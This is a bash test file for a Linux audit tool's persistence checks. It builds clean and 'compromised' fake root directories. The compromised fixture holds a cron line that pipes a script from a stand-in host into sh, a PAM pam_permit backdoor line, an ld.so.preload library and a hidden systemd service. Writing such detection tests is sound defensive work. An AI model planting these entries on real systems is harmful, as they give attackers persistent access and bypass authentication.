#!/usr/bin/env bash
# Pruebas de las revisiones de persistencia (checks/persistence.sh)
# shellcheck disable=SC2034

source "$LSO_BASE_DIR/modules/audit/engine.sh"
source "$LSO_BASE_DIR/modules/audit/helpers.sh"
source "$LSO_BASE_DIR/modules/audit/checks/persistence.sh"

audit_owner_uid() { echo 0; }

_base() {
    local r
    r=$(mktemp -d)
    mkdir -p "$r/etc/pam.d" "$r/etc/profile.d" "$r/etc/cron.d" "$r/etc/systemd/system" \
        "$r/tmp" "$r/var/tmp" "$r/dev/shm" "$r/root/.ssh" "$r/home/ana/.ssh" "$r/var/spool/cron/crontabs"
    printf 'root:x:0:0::/root:/bin/bash\nana:x:1000:1000::/home/ana:/bin/bash\n' > "$r/etc/passwd"
    printf 'auth required pam_unix.so\n' > "$r/etc/pam.d/common-auth"
    printf 'export PATH\n' > "$r/etc/profile"; chmod 644 "$r/etc/profile"
    printf 'k\n' > "$r/root/.ssh/authorized_keys"; chmod 600 "$r/root/.ssh/authorized_keys"
    printf 'k\n' > "$r/home/ana/.ssh/authorized_keys"; chmod 600 "$r/home/ana/.ssh/authorized_keys"
    printf '0 3 * * * root /usr/local/bin/backup\n' > "$r/etc/cron.d/backup"
    printf '[Service]\nExecStart=/usr/bin/foo\n' > "$r/etc/systemd/system/foo.service"
    printf '#!/bin/sh -e\n# comentario\nexit 0\n' > "$r/etc/rc.local"; chmod 755 "$r/etc/rc.local"
    echo "$r"
}

_run() { AUDIT_ROOT="$1"; audit_run_all persistence; }
_all="PER-001 PER-002 PER-003 PER-004 PER-005 PER-006 PER-007 PER-008 PER-009 PER-010 PER-011"

test_persistence_clean() {
    local r id
    r=$(_base); _run "$r"
    for id in $_all; do
        assert_eq PASS "${AUDIT_STATUS[$id]}" "$id: ${AUDIT_DETAIL[$id]}"
    done
    rm -rf "$r"
}

test_persistence_compromised() {
    local r id
    r=$(_base)
    printf '/lib/x/libevil.so\n' > "$r/etc/ld.so.preload"
    printf 'x\n' > "$r/tmp/su"; chmod 4755 "$r/tmp/su"
    printf '#!/bin/sh\n' > "$r/dev/shm/run"; chmod 755 "$r/dev/shm/run"
    chmod 644 "$r/root/.ssh/authorized_keys"
    chmod 666 "$r/home/ana/.ssh/authorized_keys"
    printf '*/5 * * * * root curl -s http://x.example/p.sh | sh\n' > "$r/etc/cron.d/evil"
    printf '[Service]\nExecStart=/var/tmp/.x/agent\n' > "$r/etc/systemd/system/evil.service"
    mkdir -p "$r/var/tmp/.x"; printf '#!/bin/sh\n' > "$r/var/tmp/.hidden"; chmod 755 "$r/var/tmp/.hidden"
    printf 'auth sufficient pam_permit.so\n' >> "$r/etc/pam.d/common-auth"
    printf 'x\n' > "$r/etc/profile.d/evil.sh"; chmod 666 "$r/etc/profile.d/evil.sh"
    printf '#!/bin/sh -e\n/usr/local/bin/startme &\nexit 0\n' > "$r/etc/rc.local"
    _run "$r"
    for id in PER-001 PER-002 PER-003 PER-004 PER-005 PER-006 PER-007 PER-009 PER-010; do
        assert_eq FAIL "${AUDIT_STATUS[$id]}" "$id: ${AUDIT_DETAIL[$id]}"
    done
    assert_eq WARN "${AUDIT_STATUS[PER-008]}" "PER-008: ${AUDIT_DETAIL[PER-008]}"
    assert_eq WARN "${AUDIT_STATUS[PER-011]}" "PER-011: ${AUDIT_DETAIL[PER-011]}"
    assert_contains "${AUDIT_DETAIL[PER-002]}" "/tmp/su"
    assert_contains "${AUDIT_DETAIL[PER-006]}" "/etc/cron.d/evil"
    assert_contains "${AUDIT_DETAIL[PER-007]}" "evil.service"
    assert_contains "${AUDIT_DETAIL[PER-009]}" "common-auth"
    rm -rf "$r"
}

test_empty_ld_preload_passes() {
    local r
    r=$(_base); : > "$r/etc/ld.so.preload"
    _run "$r"
    assert_eq PASS "${AUDIT_STATUS[PER-001]}"
    rm -rf "$r"
}

test_pam_permit_in_comment_passes() {
    local r
    r=$(_base); printf '# auth sufficient pam_permit.so\naccount required pam_permit.so\n' >> "$r/etc/pam.d/common-auth"
    _run "$r"
    assert_eq PASS "${AUDIT_STATUS[PER-009]}"
    rm -rf "$r"
}
